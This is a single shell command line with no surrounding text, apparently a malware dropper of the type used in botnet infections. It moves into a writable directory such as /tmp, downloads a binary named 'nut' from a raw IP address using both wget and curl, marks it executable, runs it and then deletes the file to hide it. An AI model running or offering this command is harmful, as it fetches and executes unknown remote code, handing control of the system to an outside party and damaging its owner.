cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.77.64/nut; curl -O http://104.244.77.64/nut; chmod +x nut; ./nut; rm -rf nut
